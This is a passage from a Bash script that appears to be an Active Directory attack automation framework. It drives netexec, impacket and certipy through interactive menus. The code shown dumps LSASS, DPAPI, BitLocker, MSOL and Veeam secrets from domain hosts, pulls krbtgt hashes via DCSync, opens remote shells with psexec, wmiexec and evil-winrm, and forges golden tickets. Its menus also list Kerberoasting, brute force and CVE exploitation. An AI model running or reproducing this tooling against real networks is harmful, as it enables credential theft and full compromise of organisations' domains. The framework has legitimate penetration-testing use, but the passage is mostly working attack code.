        while IFS= read -r i; do
            echo -e "${CYAN}[*] LSA dump of ${i} ${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --lsa --log ${output_dir}/Credentials/lsa_dump_${dc_domain}_${i}.txt" 2>&1
        done <"${servers_smb_list}"
    fi
    echo -e ""
}

lsassy_dump() {
    echo -e "${BLUE}[*] Dumping LSASS using lsassy${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
            curr_targets="Domain Controllers"
        fi
        smb_scan
        while IFS= read -r i; do
            echo -e "${CYAN}[*] LSASS dump of ${i} using lsassy${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M lsassy --log ${output_dir}/Credentials/lsass_dump_lsassy_${dc_domain}_${i}.txt" 2>&1
        done <"${servers_smb_list}"
    fi
    echo -e ""
}

handlekatz_dump() {
    echo -e "${BLUE}[*] Dumping LSASS using handlekatz${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
            curr_targets="Domain Controllers"
        fi
        smb_scan
        while IFS= read -r i; do
            echo -e "${CYAN}[*] LSASS dump of ${i} using handlekatz${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M handlekatz --log ${output_dir}/Credentials/lsass_dump_handlekatz_${dc_domain}_${i}.txt" 2>&1
        done <"${servers_smb_list}"
    fi
    echo -e ""
}

procdump_dump() {
    echo -e "${BLUE}[*] Dumping LSASS using procdump${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
            curr_targets="Domain Controllers"
        fi
        smb_scan
        while IFS= read -r i; do
            echo -e "${CYAN}[*] LSASS dump of ${i} using procdump ${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M procdump --log ${output_dir}/Credentials/lsass_dump_procdump_${dc_domain}_${i}.txt" 2>&1
        done <"${servers_smb_list}"
    fi
    echo -e ""
}

nanodump_dump() {
    echo -e "${BLUE}[*] Dumping LSASS using nanodump${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
            curr_targets="Domain Controllers"
        fi
        smb_scan
        while IFS= read -r i; do
            echo -e "${CYAN}[*] LSASS dump of ${i} using nanodump ${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M nanodump --log ${output_dir}/Credentials/lsass_dump_nanodump_${dc_domain}_${i}.txt" 2>&1
        done <"${servers_smb_list}"
    fi
    echo -e ""
}

dpapi_dump() {
    echo -e "${BLUE}[*] Dumping DPAPI secrets using netexec${NC}"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] DPAPI dump requires credentials${NC}"
    else
        if [ "${kerb_bool}" == true ]; then
            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
            curr_targets="Domain Controllers"
        fi
        smb_scan
        while IFS= read -r i; do
            echo -e "${CYAN}[*] DPAPI dump of ${i} using netexec ${NC}"
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --dpapi cookies --log ${output_dir}/Credentials/dpapi_dump_${dc_domain}_${i}.txt" 2>&1
            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --dpapi nosystem --log ${output_dir}/Credentials/dpapi_dump_${dc_domain}_${i}.txt" 2>&1
        done <"${servers_smb_list}"
    fi
    echo -e ""
}

donpapi_dump() {
    if [ ! -f "${donpapi}" ]; then
        echo -e "${RED}[-] DonPAPI.py not found! Please verify the installation of DonPAPI${NC}"
    else
        echo -e "${BLUE}[*] Dumping secrets using DonPAPI${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] DonPAPI requires credentials${NC}"
        else
            smb_scan
            current_dir=$(pwd)
            cd "${output_dir}/Credentials" || exit
            while IFS= read -r i; do
                echo -e "${CYAN}[*] DonPAPI dump of ${i} ${NC}"
                run_command "${donpapi} ${argument_donpapi}\\@${i} -dc-ip ${dc_ip}" | tee "${output_dir}/Credentials/DonPAPI_${dc_domain}_${i}.txt"
            done <"${servers_smb_list}"
            cd "${current_dir}" || exit
        fi
    fi
    echo -e ""
}

hekatomb_dump() {
    if [ ! -f "${hekatomb}" ]; then
        echo -e "${RED}[-] hekatomb.py not found! Please verify the installation of HEKATOMB${NC}"
    else
        echo -e "${BLUE}[*] Dumping secrets using hekatomb${NC}"
        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] hekatomb requires credentials and does not support Kerberos authentication${NC}"
        else
            current_dir=$(pwd)
            cd "${output_dir}/Credentials" || exit
            run_command "${hekatomb} ${argument_hekatomb}\\@${dc_ip} -dns ${dc_ip} -smb2 -csv" | tee "${output_dir}/Credentials/hekatomb_${dc_domain}.txt"
            cd "${current_dir}" || exit
        fi
    fi
    echo -e ""
}

bitlocker_dump() {
    if [ ! -f "${ExtractBitlockerKeys}" ]; then
        echo -e "${RED}[-] Please verify the installation of ExtractBitlockerKeys${NC}"
    else
        echo -e "${BLUE}[*] Extracting BitLocker keys using ExtractBitlockerKeys${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] ExtractBitlockerKeys requires credentials ${NC}"
        else
            if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v"; else verbose_p0dalirius=""; fi
            run_command "${ExtractBitlockerKeys} ${argument_p0dalirius} ${ldaps_param} ${verbose_p0dalirius} --kdcHost ${dc_FQDN} --dc-ip ${dc_ip}" 2>&1 | tee "${output_dir}/Credentials/bitlockerdump_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

msol_dump() {
    echo -e "${BLUE}[*] MSOL password dump. Please specify IP or hostname of Azure AD-Connect server:${NC}"
    target_msol=""
    read -rp ">> " target_msol </dev/tty
    while [ "${target_msol}" == "" ]; do
        echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
        read -rp ">> " target_msol </dev/tty
    done
    run_command "${netexec} ${ne_verbose} smb ${target_msol} ${argument_ne} -M msol --log ${output_dir}/Credentials/msol_${dc_domain}_${i}.txt" 2>&1
    echo -e ""
}

veeam_dump() {
    echo -e "${BLUE}[*] Veeam credentials dump. Please specify IP or hostname of Veeam server:${NC}"
    target_veeam=""
    read -rp ">> " target_veeam </dev/tty
    while [ "${target_veeam}" == "" ]; do
        echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
        read -rp ">> " target_veeam </dev/tty
    done
    run_command "${netexec} ${ne_verbose} smb ${target_veeam} ${argument_ne} -M veeam --log ${output_dir}/Credentials/veeam_${dc_domain}_${i}.txt" 2>&1
    echo -e ""
}

get_hash() {
    if [ ! -f "${impacket_secretsdump}" ]; then
        echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
    else
        gethash_nt=""
        gethash_aes=""
        if [ ! -f "${output_dir}/Credentials/hash_${gethash_user}_${dc_domain}.txt" ]; then
            echo -e "${BLUE}[*] Extracting NTLM hash and AES keys of ${gethash_user}${NC}"
            if [ "${nullsess_bool}" == true ]; then
                echo -e "${PURPLE}[-] DCSync requires credentials${NC}"
            else
                run_command "${impacket_secretsdump} ${argument_imp}\\@${target} -just-dc-user $(echo "${domain}" | cut -d "." -f 1)/${gethash_user}" | tee "${output_dir}/Credentials/hash_${gethash_user}_${dc_domain}.txt"
            fi
        else
            echo -e "${YELLOW}[i] Hash file of ${gethash_user} found, skipping... ${NC}"
        fi
        gethash_nt=$(grep "${gethash_user}" "${output_dir}/Credentials/hash_${gethash_user}_${dc_domain}.txt" | grep -v "aes\|des" | cut -d ":" -f 4)
        gethash_aes=$(grep "aes256" "${output_dir}/Credentials/hash_${gethash_user}_${dc_domain}.txt" | cut -d ":" -f 3)
    fi
    echo -e ""
}

###### cmd_exec: Open CMD Console
smbexec_console() {
    if [ ! -f "${impacket_smbexec}" ]; then
        echo -e "${RED}[-] smbexec.py not found! Please verify the installation of impacket ${NC}"
    elif [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] smbexec requires credentials${NC}"
    else
        echo -e "${BLUE}Please specify target IP or hostname:${NC}"
        read -rp ">> " smbexec_target </dev/tty
        while [ "${smbexec_target}" == "" ]; do
            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
            read -rp ">> " smbexec_target </dev/tty
        done
        echo -e "${BLUE}[*] Opening smbexec.py console on target: $smbexec_target ${NC}"
        run_command "${impacket_smbexec} ${argument_imp}\\@${smbexec_target}" 2>&1 | tee -a "${output_dir}/CommandExec/impacket_smbexec_output.txt"
    fi
    echo -e ""
}

wmiexec_console() {
    if [ ! -f "${impacket_wmiexec}" ]; then
        echo -e "${RED}[-] wmiexec.py not found! Please verify the installation of impacket ${NC}"
    elif [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] wmiexec requires credentials${NC}"
    else
        echo -e "${BLUE}Please specify target IP or hostname:${NC}"
        read -rp ">> " wmiexec_target </dev/tty
        while [ "${wmiexec_target}" == "" ]; do
            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
            read -rp ">> " wmiexec_target </dev/tty
        done
        echo -e "${BLUE}[*] Opening wmiexec.py console on target: $wmiexec_target ${NC}"
        run_command "${impacket_wmiexec} ${argument_imp}\\@${wmiexec_target}" 2>&1 | tee -a "${output_dir}/CommandExec/impacket_wmiexec_output.txt"
    fi
    echo -e ""
}

psexec_console() {
    if [ ! -f "${impacket_psexec}" ]; then
        echo -e "${RED}[-] psexec.py not found! Please verify the installation of impacket ${NC}"
    elif [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] psexec requires credentials${NC}"
    else
        echo -e "${BLUE}Please specify target IP or hostname:${NC}"
        read -rp ">> " psexec_target </dev/tty
        while [ "${psexec_target}" == "" ]; do
            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
            read -rp ">> " psexec_target </dev/tty
        done
        echo -e "${BLUE}[*] Opening psexec.py console on target: $psexec_target ${NC}"
        run_command "${impacket_psexec} ${argument_imp}\\@${psexec_target}" 2>&1 | tee -a "${output_dir}/CommandExec/impacket_psexec_output.txt"
    fi
    echo -e ""
}

evilwinrm_console() {
    if [ ! -f "${evilwinrm}" ]; then
        echo -e "${RED}[-] evilwinrm not found! Please verify the installation of evilwinrm ${NC}"
    elif [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] evilwinrm requires credentials${NC}"
    else
        echo -e "${BLUE}Please specify target IP or hostname:${NC}"
        read -rp ">> " evilwinrm_target </dev/tty
        while [ "${evilwinrm_target}" == "" ]; do
            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
            read -rp ">> " evilwinrm_target </dev/tty
        done
        echo -e "${BLUE}[*] Opening evilwinrm console on target: $evilwinrm_target ${NC}"
        run_command "${evilwinrm} -i ${evilwinrm_target} ${argument_evilwinrm}" 2>&1 | tee -a "${output_dir}/CommandExec/impacket_evilwinrm_output.txt"
    fi
    echo -e ""
}

ad_enum() {
    if [ "${nullsess_bool}" == true ]; then
        ldapdomaindump_enum
        enum4linux_enum
        ne_gpp
        ne_smb_enum
        windapsearch_enum
    else
        bhd_enum
        ldapdomaindump_enum
        enum4linux_enum
        ne_gpp
        ne_smb_enum
        ne_ldap_enum
        deleg_enum
        bloodyad_all_enum
        bloodyad_write_enum
        windapsearch_enum
        ldapwordharv_enum
        rdwatool_enum
        sccm_enum
        GPOwned_enum
    fi
}

adcs_enum() {
    if [ "${nullsess_bool}" == true ]; then
        ne_adcs_enum
    else
        ne_adcs_enum
        certi_py_enum
        certipy_enum
        certifried_check
    fi
}

bruteforce() {
    if [ "${nullsess_bool}" == true ]; then
        ridbrute_attack
        kerbrute_enum
        userpass_kerbrute_check
        pre2k_check
    else
        userpass_kerbrute_check
        pre2k_check
    fi
}

kerberos() {
    if [ "${nullsess_bool}" == true ]; then
        asrep_attack
        kerberoast_attack
        asreprc4_attack
        john_crack_asrep
        john_crack_kerberoast
    else
        asrep_attack
        kerberoast_attack
        john_crack_asrep
        john_crack_kerberoast
        nopac_check
        ms14-068_check
    fi
}

scan_shares() {
    smb_map
    ne_shares
    ne_spider
    finduncshar_scan
}

vuln_checks() {
    zerologon_check
    ms17-010_check
    petitpotam_check
    dfscoerce_check
    spooler_check
    printnightmare_check
    webdav_check
    shadowcoerce_check
    smbsigning_check
    ntlmv1_check
    runasppl_check
    rpcdump_check
}

mssql_checks() {
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${RED}MSSQL checks requires credentials.${NC}"
    else
        mssql_enum
        mssql_relay_check
    fi
}

pwd_dump() {
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${RED}Password dump requires credentials.${NC}"
    else
        laps_dump
        gmsa_dump
        secrets_dump
        nanodump_dump
        dpapi_dump
        juicycreds_dump
    fi
}

print_info() {
    echo -e "${YELLOW}[i]${NC} Target domain: ${YELLOW}${dc_domain}${NC}"
    echo -e "${YELLOW}[i]${NC} Domain Controller's FQDN: ${YELLOW}${dc_FQDN}${NC}"
    echo -e "${YELLOW}[i]${NC} Domain Controller's IP: ${YELLOW}${dc_ip}${NC}"
    echo -e "${YELLOW}[i]${NC} Domain Controller's ports: RPC ${dc_port_135}, SMB ${dc_port_445}, LDAP ${dc_port_389}, LDAPS ${dc_port_636}"
    echo -e "${YELLOW}[i]${NC} Output folder: ${YELLOW}${output_dir}${NC}"
    echo -e "${YELLOW}[i]${NC} User wordlist file: ${YELLOW}${user_wordlist}${NC}"
    echo -e "${YELLOW}[i]${NC} Password wordlist file: ${YELLOW}${pass_wordlist}${NC}"
    echo -e "${YELLOW}[i]${NC} Attacker's IP: ${YELLOW}${attacker_IP}${NC}"
    echo -e "${YELLOW}[i]${NC} Attacker's Interface: ${YELLOW}${attacker_interface}${NC}"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW}${curr_targets} ${custom_servers}${custom_ip}${NC}"
}

modify_target() {
    echo -e ""
    echo -e "${YELLOW}[Modify target(s)]${NC} Please choose from the following options:"
    echo -e "------------------------------------------------------------"
    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
    echo -e "1) Domain Controllers"
    echo -e "2) All domain servers"
    echo -e "3) File containing list of servers"
    echo -e "4) IP or hostname"
    echo -e "back) Go back"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    1)
        curr_targets="Domain Controllers"
        custom_servers=""
        custom_ip=""
        ;;

    2)
        curr_targets="All domain servers"
        custom_servers=""
        custom_ip=""
        ;;

    3)
        curr_targets="File containing list of servers"
        custom_servers=""
        custom_ip=""
        custom_target_scanned=false
        /bin/rm "${custom_servers_list}" 2>/dev/null
        read -rp ">> " custom_servers </dev/tty
        /bin/cp "$custom_servers" "${custom_servers_list}" 2>/dev/null
        while [ ! -s "${custom_servers_list}" ]; do
            echo -e "${RED}Invalid servers list.${NC} Please specify file containing list of target servers:"
            read -rp ">> " custom_servers </dev/tty
            /bin/cp "$custom_servers" "${custom_servers_list}" 2>/dev/null
        done
        ;;

    4)
        curr_targets="IP or hostname"
        custom_servers=""
        custom_ip=""
        custom_target_scanned=false
        /bin/rm "${custom_servers_list}" 2>/dev/null
        read -rp ">> " custom_ip </dev/tty
        echo -n "$custom_ip" >"${custom_servers_list}" 2>/dev/null
        while [ ! -s "${custom_servers_list}" ]; do
            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
            read -rp ">> " custom_ip </dev/tty
            echo -n "$custom_ip" >"${custom_servers_list}" 2>/dev/null
        done
        ;;

    back) ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        modify_target
        ;;
    esac
}

set_attackerIP() {
    echo -e "Please choose the attacker's IPs from the following options:"
    attacker_IPlist=("$(/usr/bin/hostname -I)")
    for ip in "${attacker_IPlist[@]}"; do
        echo -e "${YELLOW}${ip}${NC}"
    done
    attacker_IP=""
    read -rp ">> " attacker_IP </dev/tty
    for ip in "${attacker_IPlist[@]}"; do
        if [[ "$ip" == "$attacker_IP" ]]; then
            matched=true
        fi
    done
    while [[ ! $matched == true ]]; do
        echo -e "${RED}Invalid IP.${NC} Please specify your IP from the list"
        read -rp ">> " attacker_IP </dev/tty
        for val in "${attacker_IPlist[@]}"; do
            if [[ "$val" == "$attacker_IP" ]]; then
                matched=true
            fi
        done
    done
}

pkinit_auth() {
    current_dir=$(pwd)
    cd "${output_dir}/Credentials" || exit
    if [[ "${pfxpass}" == "" ]]; then
        run_command "${certipy} auth -pfx ${pfxcert} -dc-ip ${dc_ip} -username ${user} -domain ${domain}" | tee "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
    else
        echo -e "${CYAN}[i]${NC} Certificate password is provided, generating new unprotected certificate using Certipy${NC}"
        run_command "${certipy} cert -export -pfx $(realpath "$pfxcert") -password $pfxpass -out ${user}_unprotected.pfx" | tee "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
        run_command "${certipy} auth -pfx ${user}_unprotected.pfx -dc-ip ${dc_ip} -username ${user} -domain ${domain}" | tee -a "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
    fi
    hash=$(grep "Got hash for" "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt" | cut -d " " -f 6)
    echo -e "${GREEN}[+] NTLM hash extracted:${NC} $hash"
    cd "${current_dir}" || exit
}

ad_menu() {
    echo -e ""
    echo -e "${CYAN}[AD Enum menu]${NC} Please choose from the following options:"
    echo -e "--------------------------------------------------------"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "A) ACTIVE DIRECTORY ENUMERATIONS #3-4-5-6-14"
    else
        echo -e "A) ACTIVE DIRECTORY ENUMERATIONS #1-3-4-5-6-7-8-9-10-14-15-16-17-20"
    fi
    echo -e "1) BloodHound Enumeration using all collection methods (Noisy!)"
    echo -e "2) BloodHound Enumeration using DCOnly"
    echo -e "1bis) BloodHoundCE Enumeration using all collection methods (Noisy!)"
    echo -e "2bis) BloodHoundCE Enumeration using DCOnly"
    echo -e "3) ldapdomaindump LDAP Enumeration"
    echo -e "4) enum4linux-ng LDAP-MS-RPC Enumeration"
    echo -e "5) GPP Enumeration using netexec"
    echo -e "6) MS-RPC Enumeration using netexec (Users, pass pol)"
    echo -e "7) LDAP Enumeration using netexec (Users, passnotreq, userdesc, maq, ldap-checker, subnets)"
    echo -e "8) Delegation Enumeration using findDelegation and netexec"
    echo -e "9) bloodyAD All Enumeration"
    echo -e "10) bloodyAD write rights Enumeration"
    echo -e "11) bloodyAD query DNS server"
    echo -e "12) SilentHound LDAP Enumeration"
    echo -e "13) ldeep LDAP Enumeration"
    echo -e "14) windapsearch LDAP Enumeration"
    echo -e "15) LDAP Wordlist Harvester"
    echo -e "16) Enumeration of RDWA servers"
    echo -e "17) SCCM Enumeration using sccmhunter"
    echo -e "18) LDAP Enumeration using LDAPPER"
    echo -e "19) Adalanche Enumeration"
    echo -e "20) GPO Enumeration using GPOwned"
    echo -e "21) Open p0dalirius' LDAP Console"
    echo -e "22) Open p0dalirius' LDAP Monitor"
    echo -e "23) Open garrettfoster13's ACED console"
    echo -e "24) Open LDAPPER custom options"
    echo -e "25) Run adPEAS enumerations"
    echo -e "26) Open breads console"
    echo -e "27) Run ADCheck enumerations"
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    A)
        ad_enum
        ad_menu
        ;;

    1)
        bhd_enum
        ad_menu
        ;;

    2)
        bhd_enum_dconly
        ad_menu
        ;;

    1bis)
        bhdce_enum
        ad_menu
        ;;

    2bis)
        bhdce_enum_dconly
        ad_menu
        ;;

    3)
        ldapdomaindump_enum
        ad_menu
        ;;

    4)
        enum4linux_enum
        ad_menu
        ;;

    5)
        ne_gpp
        ad_menu
        ;;

    6)
        ne_smb_enum
        ad_menu
        ;;

    7)
        ne_ldap_enum
        ad_menu
        ;;

    8)
        deleg_enum
        ad_menu
        ;;

    9)
        bloodyad_all_enum
        ad_menu
        ;;

    10)
        bloodyad_write_enum
        ad_menu
        ;;

    11)
        bloodyad_dnsquery
        ad_menu
        ;;

    12)
        silenthound_enum
        ad_menu
        ;;

    13)
        ldeep_enum
        ad_menu
        ;;

    14)
        windapsearch_enum
        ad_menu
        ;;

    15)
        ldapwordharv_enum
        ad_menu
        ;;

    16)
        rdwatool_enum
        ad_menu
        ;;

    17)
        sccm_enum
        ad_menu
        ;;

    18)
        ldapper_enum
        ad_menu
        ;;

    19)
        adalanche_enum
        ad_menu
        ;;

    20)
        GPOwned_enum
        ad_menu
        ;;

    21)
        ldap_console
        ad_menu
        ;;

    22)
        ldap_monitor
        ad_menu
        ;;

    23)
        aced_console
        ad_menu
        ;;

    24)
        ldapper_console
        ad_menu
        ;;

    25)
        adpeas_enum
        ad_menu
        ;;

    26)
        breads_console
        ad_menu
        ;;

    27)
        adcheck_enum
        ad_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        ad_menu
        ;;
    esac
}

adcs_menu() {
    echo -e ""
    echo -e "${CYAN}[ADCS menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "A) ADCS ENUMERATIONS #1"
    else
        echo -e "A) ADCS ENUMERATIONS #1-2-3-4"
    fi
    echo -e "1) ADCS Enumeration using netexec"
    echo -e "2) certi.py ADCS Enumeration"
    echo -e "3) Certipy ADCS Enumeration"
    echo -e "4) Certifried check"
    echo -e "5) Certipy LDAP shell via Schannel (using Certificate Authentication)"
    echo -e "6) Certipy extract CA and forge Golden Certificate (requires admin rights on PKI server)"
    echo -e "7) Dump LSASS using masky"
    echo -e "8) Dump NTDS using certsync"
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    A)
        adcs_enum
        adcs_menu
        ;;

    1)
        ne_adcs_enum
        adcs_menu
        ;;

    2)
        certi_py_enum
        adcs_menu
        ;;

    3)
        certipy_enum
        adcs_menu
        ;;

    4)
        certifried_check
        adcs_menu
        ;;

    5)
        certipy_ldapshell
        adcs_menu
        ;;

    6)
        certipy_ca_dump
        adcs_menu
        ;;

    7)
        masky_dump
        adcs_menu
        ;;

    8)
        certsync_ntds_dump
        adcs_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        adcs_menu
        ;;
    esac
}

bruteforce_menu() {
    echo -e "${CYAN}[BruteForce menu]${NC} Please choose from the following options:"
    echo -e "----------------------------------------------------------"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "A) BRUTEFORCE ATTACKS #1-2-3-5"
    else
        echo -e "A) BRUTEFORCE ATTACKS #3-5"
    fi
    echo -e "1) RID Brute Force (Null session) using netexec"
    echo -e "2) User Enumeration using kerbrute (Null session)"
    echo -e "3) User=Pass check using kerbrute (Noisy!)"
    echo -e "4) User=Pass check using netexec (Noisy!)"
    echo -e "5) Pre2k computers authentication check (Noisy!)"
    echo -e "6) User Enumeration using ldapnomnom (Null session)"
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    A)
        bruteforce
        bruteforce_menu
        ;;

    1)
        ridbrute_attack
        bruteforce_menu
        ;;

    2)
        kerbrute_enum
        bruteforce_menu
        ;;

    3)
        userpass_kerbrute_check
        bruteforce_menu
        ;;

    4)
        userpass_ne_check
        bruteforce_menu
        ;;

    5)
        pre2k_check
        bruteforce_menu
        ;;

    6)
        ldapnomnom_enum
        bruteforce_menu
        ;;

    back)
        main_menu
        ;;

    exit)
        exit 1
        ;;

    *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        bruteforce_menu
        ;;
    esac
}

kerberos_menu() {
    echo -e ""
    echo -e "${CYAN}[Kerberos Attacks menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------------------"
    if [ "${nullsess_bool}" == true ]; then
        echo -e "A) KERBEROS ATTACKS #1-2-3-4-7"
    else
        echo -e "A) KERBEROS ATTACKS #1-2-3-4-5-6"
    fi
    echo -e "1) AS REP Roasting Attack using GetNPUsers"
    echo -e "2) Kerberoast Attack using GetUserSPNs"
    echo -e "3) Cracking AS REP Roast hashes using john the ripper"
    echo -e "4) Cracking Kerberoast hashes using john the ripper"
    echo -e "5) NoPac check using netexec (only on DC)"
    echo -e "6) MS14-068 check (only on DC)"
    echo -e "7) CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)"
    echo -e "8) AP-REQ hijack with DNS unsecure updates abuse using krbjack"
    echo -e "9) Run custom Kerberoast attack using Orpheus"
    echo -e "10) Generate Golden Ticket (requires: hash of krbtgt or DCSync rights)"
    echo -e "11) Generate Silver Ticket (requires: hash of SPN service account or DCSync rights)"
    echo -e "12) Generate Diamond Ticket (requires: hash of krbtgt or DCSync rights)"
    echo -e "13) Generate Sapphire Ticket (requires: hash of krbtgt or DCSync rights)"
    echo -e "14) Privilege escalation from Child Domain to Parent Domain using raiseChild (requires: DA rights on child domain)"
    echo -e "15) Request impersonated ticket using Constrained Delegation rights (requires: hash of account allowed for delegation or DCSync rights)"
    echo -e "back) Go back"
    echo -e "exit) Exit"

    read -rp "> " option_selected </dev/tty

    case ${option_selected} in
    A)
        kerberos
        kerberos_menu
        ;;

    1)
        asrep_attack
        kerberos_menu
        ;;

    2)
        kerberoast_attack
        kerberos_menu
        ;;

    3)
        john_crack_asrep
        kerberos_menu
        ;;

    4)
        john_crack_kerberoast
        kerberos_menu
        ;;

    5)
        nopac_check
        kerberos_menu
        ;;

    6)
        ms14-068_check
        kerberos_menu
        ;;

    7)
        asreprc4_attack
        kerberos_menu
        ;;

    8)
        krbjack_attack
        kerberos_menu
        ;;

    9)
        kerborpheus_attack
        kerberos_menu
        ;;

    10)
        if [ ! -f "${impacket_ticketer}" ]; then
            echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
        else
            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
                echo -e "Please specify '1' for NTLM and '2' for AES:"
                read -rp ">> " ntlm_or_aes </dev/tty
                while [[ "${ntlm_or_aes}" -ne 1 ]] && [[ "${ntlm_or_aes}" -ne 2 ]]; do
                    echo -e "${RED}Wrong input${NC} Please specify '1' for NTLM and '2' for AES:"
                    read -rp ">> " ntlm_or_aes </dev/tty
                done
                gethash_user="krbtgt"
                gethash_hash=""
                echo -e "Please specify the NTLM or AES hash of krbtgt (press Enter to extract hash from NTDS (requires DCSync rights):"
                read -rp ">> " gethash_hash </dev/tty
                if [[ ${gethash_hash} == "" ]]; then
                    get_hash
                else
                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_nt="$gethash_hash"; else gethash_aes="$gethash_hash"; fi
                fi

                if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
                    echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
                else
                    if [[ ${ntlm_or_aes} -eq 1 ]]; then gethash_key="-nthash ${gethash_nt}"; else gethash_key="-aesKey ${gethash_aes}"; fi

                    tick_randuser="Administrator"
                    tick_user_id=""
                    tick_groups=""
                    echo -e "Please specify random user name (press Enter to choose default value 'Administrator'):"
                    read -rp ">> " tick_randuser_value </dev/tty
                    if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
                    echo -e "Please specify custom user id (press Enter to skip):"
                    read -rp ">> " tick_user_id_value </dev/tty
                    if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="-user-id ${tick_user_id_value}"; fi
                    echo -e "Please specify comma separated custom groups ids (e.g. '512,513,518,519,520') (press Enter to skip):"
                    read -rp ">> " tick_group_ids_value </dev/tty
                    if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="-groups ${tick_group_ids_value}"; fi
                    while [[ "${sid_domain}" == "" ]]; do
                        echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
                        read -rp ">> " sid_domain </dev/tty
                    done
                    echo -e "${CYAN}[*] Generating golden ticket...${NC}"
                    current_dir=$(pwd)
                    cd "${output_dir}/Credentials" || exit
                    run_command "${impacket_ticketer} ${gethash_key} -domain-sid ${sid_domain} -domain ${domain} ${tick_user_id} ${tick_groups} ${tick_randuser}"
                    run_command "${impacket_ticketconverter} ./${tick_randuser}.ccache ./${tick_randuser}.kirbi"
                    /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_golden.ccache" 2>/dev/null
                    /bin/mv "./${tick_randuser}.kirbi" "./${tick_randuser}_golden.kirbi" 2>/dev/null
                    cd "${current_dir}" || exit
                    if [ -f "${output_dir}/Credentials/${tick_randuser}_golden.ccache" ]; then
                        echo -e "${GREEN}[+] Golden ticket generated successfully:${NC}"
                        echo -e "${output_dir}/Credentials/${tick_randuser}_golden.ccache"
